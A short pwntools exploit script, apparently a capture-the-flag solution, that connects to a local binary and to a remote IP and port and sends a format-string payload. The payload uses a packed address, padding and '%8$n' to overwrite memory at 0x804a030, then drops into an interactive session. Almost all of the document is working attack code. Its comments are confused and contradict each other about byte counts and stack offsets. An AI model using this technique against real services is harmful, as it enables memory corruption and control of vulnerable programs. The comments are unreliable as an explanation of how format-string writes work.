from pwn import *

elf = ELF('/home/kali/Downloads/format')
p=elf.process()
p=remote('34.185.222.215', 30484)

#write s (200)
#printf s
#write format from 15 to 200
#copy s to format
#-> format200 + s200
#print format

    
p.recvuntil(b"?\n")

#offset to our fmt str (the first time we see our input in stack) is 7

offset = 22
#sau 21 idk

addr = 0x804a030
value =  0x20

#payload  = b"%9$p"         #lets keep it as 4 bytes
payload = b"by" #2 bytes
payload += p32(0x804a030) # 4 bytes, 6 in total  
payload += b"c"*12 #add another 26 bytes theoretically
		   #no clue why 'c'*12 is 26 bytes but whatever
		    # so 32 in total now
		    
payload += b"%8$n" #modify the address at offset 8 with total length
		   #doesnt actually print anything so it doesnt modify length
		   
#payload = b"AA" + p32(0x804a030) + b"." + b"%p." * 20


p.sendline(payload)

p.interactive()
